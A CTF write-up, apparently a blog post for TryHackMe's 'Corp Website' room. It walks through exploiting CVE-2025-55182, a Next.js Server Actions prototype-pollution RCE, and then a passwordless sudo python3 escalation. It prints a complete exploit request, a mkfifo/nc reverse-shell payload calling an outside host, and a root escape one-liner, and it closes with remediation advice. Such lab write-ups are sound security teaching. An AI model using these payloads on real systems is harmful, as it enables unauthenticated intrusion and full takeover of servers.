@@ -1,0 +1,236 @@
+---
+title: 'Corp Website'
+description: 'Exploiting CVE-2025-55182, a prototype-pollution RCE in Next.js Server Actions, then escalating to root via a passwordless sudo rule.'
+date: 2026-10-05
+platform: tryhackme
+room: 'Corp Website'
+roomUrl: 'https://tryhackme.com/room/lafb2026e7'
+difficulty: medium
+tags: [web, nextjs, rce, cve-2025-55182, sudo, docker]
+vulnClasses: [Prototype Pollution, Remote Code Execution, SUID / Sudo Misconfiguration]
+translation: done
+draft: false
+---
+
+## **TryHackMe: Corp Website — Next.js Server Actions RCE and a Dockerfile That Gives Away Everything**
+
+_A walkthrough of the "Corp Website" challenge from the Love at First Breach 2026 event. A Next.js application on port 3000 is vulnerable to CVE-2025-55182 — a prototype-pollution RCE in Server Actions. One crafted multipart POST gives a shell; reading the Dockerfile reveals a passwordless_ _`sudo python3`_ _rule that escalates straight to root._
+
+> Flag values are redacted. Corp Website is a challenge on an authorized TryHackMe event.
+
+---
+
+### **TL;DR — the whole chain**
+
+Identify Next.js from response headers → CVE-2025-55182 Server Actions prototype-pollution RCE → reverse shell as `daniel` → read `Dockerfile` → `sudo python3` NOPASSWD → **root**.
+
+### **The target**
+
+```text
+export IP=10.48.168.0
+nmap -sC -sV -p 3000 $IP
+```
+
+```text
+3000/tcp open  http  Next.js
+X-Powered-By: Next.js
+x-nextjs-cache: HIT
+```
+
+A single port. The `X-Powered-By: Next.js` response header and the `x-nextjs-*` family of headers make the framework immediately obvious without any directory brute-force.
+
+---
+
+### **Enumeration: fingerprinting the framework**
+
+Reading the HTML source confirms the classic Next.js file layout — `/_next/static/` chunks, `__NEXT_DATA__` script tag, the build hash in the font preload URLs. The nmap fingerprint alone is enough to pivot straight to CVE research.
+
+A search for Next.js RCE in 2025 surfaces **CVE-2025-55182**, nicknamed _react2shell_: an unauthenticated remote code execution bug in Next.js Server Actions introduced by the React Server Components protocol.
+
+---
+
+### **CVE-2025-55182 — what it is and why it works**
+
+#### **Server Actions and the RSC wire format**
+
+Next.js Server Actions are `async` functions annotated with `"use server"` that run on the server and are callable from the browser via a special multipart POST. The browser sends a `Next-Action` header containing the action's ID, and the body is a multipart form whose parts are JSON-encoded React Flight (RSC) protocol payloads.
+
+The RSC protocol uses a reference system (`$1`, `$B1337`, `$Q2` …) to lazily resolve objects across streamed chunks. Crucially, it calls `JSON.parse` on those chunks and then resolves property paths dynamically — including paths that traverse `__proto__`.
+
+#### **The prototype pollution primitive**
+
+The payload plants a reference through `__proto__`:
+
+```text
+{
+  "then": "$1:__proto__:then",
+  "status": "resolved_model",
+  "value": "{\"then\":\"$B1337\"}",
+  "_response": {
+    "_prefix": "<arbitrary JS>",
+    "_chunks": "$Q2",
+    "_formData": { "get": "$1:constructor:constructor" }
+  }
+}
+```
+
+Walking `$1:__proto__:then` pollutes `Object.prototype.then`, making every plain object look like a thenable (a Promise). The RSC deserialiser then calls `.then()` on it, which resolves to the function stored in `_prefix` — executed via `constructor.constructor`, i.e. the `Function` constructor. The result: arbitrary JavaScript runs inside Node.js with the privileges of the web process.
+
+#### **Confirming RCE**
+
+Full exploit request (also works with `curl` or Burp Repeater):
+
+```text
+POST /HTTP/1.1
+Host: 10.48.168.0:3000
+Next-Action: x
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{
+  "then": "$1:__proto__:then",
+  "status": "resolved_model",
+  "reason": -1,
+  "value": "{\"then\":\"$B1337\"}",
+  "_response": {
+    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
+    "_chunks": "$Q2",
+    "_formData": { "get": "$1:constructor:constructor" }
+  }
+}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+```
+
+The `id` output comes back in the `NEXT_REDIRECT` error's `digest` field — visible in the response body. RCE confirmed without any authentication.
+
+> The trick of embedding the command output inside a thrown error's `digest` is a classic blind-to-semi-blind pivot: you cannot normally read `stdout` from a redirect error, but Next.js echoes the `digest` string verbatim in the HTTP response.
+
+---
+
+### **Initial access — reverse shell**
+
+Craft the reverse shell command and embed it as the `_prefix` value:
+
+```text
+# attacker
+nc -lvnp 4444
+```
+
+Payload `_prefix`:
+
+```text
+process.mainModule.require('child_process').execSync(
+  'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.140.77 4444 >/tmp/f',
+  {'timeout': 10000}
+)
+```
+
+Send the request → shell lands:
+
+```text
+connect to [192.168.140.77] from (UNKNOWN) [10.49.145.232] 50124
+/bin/sh: can't access tty; job control turned off
+/app $
+```
+
+Explore home directories:
+
+```text
+/app $ cd /home && ls -al
+drwxr-sr-x  daniel  secgroup
+drwxr-sr-x  node    node
+
+/home $ cd daniel && cat user.txt
+THM{[REDACTED]}
+```
+
+---
+
+### **Privilege escalation — the Dockerfile tells all**
+
+The working directory is `/app` and the app ships with its own `Dockerfile`. Reading it is the entire privilege escalation:
+
+```text
+cat /app/Dockerfile
+```
+
+```text
+FROM node:20-alpine
+
+RUN apk add --no-cache sudo python3 netcat-openbsd
+
+WORKDIR /app
+...
+RUN addgroup -S secgroup && adduser -S daniel -G secgroup
+RUN chown -R daniel:secgroup /app
+
+RUN echo"daniel ALL=(root) NOPASSWD: /usr/bin/python3" >> /etc/sudoers
+
+USER daniel
+EXPOSE 3000
+CMD ["npm","start"]
+```
+
+`daniel` can run `/usr/bin/python3` as root without a password. The standard Python sudo escape:
+
+```text
+sudo python3 -c 'import os; os.execv("/bin/sh", ["/bin/sh"])'
+```
+
+```text
+/app # id
+uid=0(root) gid=0(root)
+/app # cat /root/root.txt
+THM{[REDACTED]}
+```
+
+---
+
+### **Why the Dockerfile matters beyond "it has a sudo rule"**
+
+Dockerfiles are build instructions, not runtime secrets — but they are frequently committed to the repository and shipped inside the final image. Reading them from a foothold hands an attacker:
+
+- **Exposed sudo rules** (as here)
+- **Hardcoded secrets** (`ENV DB_PASSWORD=…`, `RUN echo "<token>" > /root/…`)
+- **Flag values literally embedded** in `RUN echo "…" >` lines
+- **Dependency versions** useful for further CVE research
+
+If a Dockerfile is reachable from a low-privilege shell, treat it as a loot file.
+
+---
+
+### **Severity**
+
+**Critical.** CVE-2025-55182 is unauthenticated and requires only a single HTTP request. Combined with a passwordless sudo rule for `python3`, full root is a two-step process with no credentials needed at any point.
+
+---
+
+### **Remediation**
+
+1. **Upgrade Next.js** — CVE-2025-55182 is patched in versions after the advisory. Pin a fixed version and enable Dependabot / Renovate for automatic alerts.
+2. **Validate** **`Next-Action`** **IDs** — legitimate Server Actions have deterministic hashed IDs. Reject requests whose `Next-Action` value does not match a known action registered at build time.
+3. **Principle of least privilege for the web process** — the application user should have no sudo rights at all, let alone `NOPASSWD: /usr/bin/python3`. Remove the sudoers line; if escalation is needed for a specific task, use a narrowly scoped wrapper with argument validation.
+4. **Don't ship the Dockerfile inside the image** — add `Dockerfile` and `.dockerignore` to `.dockerignore` so build metadata is not readable from inside a running container.
+5. **Never embed secrets or flags in** **`RUN echo`** — they bake into image layers and are readable by anyone with shell access. Use Docker secrets or environment injection at runtime.
+
+---
+
+### **Takeaways**
+
+- **`X-Powered-By`** **and** **`x-nextjs-*`** **headers fingerprint the framework in one request.** Disable or strip informational headers in production.
+- **CVE-2025-55182 needs zero authentication.** Any Next.js app using Server Actions on an affected version is exploitable from the internet with a single curl command.
+- **Prototype pollution through** **`__proto__`** **in JSON deserialisation is a recurring class of bugs.** The RSC wire format is complex; complexity breeds deserialisation gadgets.
+- **Read every file in the working directory.** `Dockerfile`, `.env`, `config.js`, `docker-compose.yml` — build and deployment artefacts left inside the container routinely contain the next step.
+- **`sudo <interpreter> NOPASSWD`** **is effectively root.** Python, node, perl, ruby, lua — any interpreter that can spawn a subprocess makes the sudo rule a one-liner to a root shell.
+
+Thanks for reading. Corp Website is a tight two-step demonstrating that framework choice matters — shipping a known-vulnerable Next.js version with a permissive sudo rule turns a corporate landing page into an open root shell.
